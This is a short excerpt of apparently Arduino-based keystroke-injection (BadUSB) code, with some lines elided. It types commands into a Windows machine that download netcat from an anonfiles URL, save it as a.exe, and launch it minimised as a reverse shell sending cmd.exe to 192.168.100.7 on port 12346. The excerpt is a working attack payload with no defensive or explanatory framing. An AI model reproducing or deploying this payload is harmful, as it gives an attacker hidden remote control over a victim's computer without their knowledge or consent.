...
delay(30);
  ...
  typeKey(KEY_RETURN);
  delay(500);
  Keyboard.print("curl.exe --output a.exe --url https://cdn-35.anonfiles.com/H8q5kfzap0/ea021901-1608036230/nc.exe");
  typeKey(KEY_RETURN);
  delay(500);
  ...
  Keyboard.print("START /MIN a.exe 192.168.100.7 12346 -e cmd.exe -d"); //& exit");
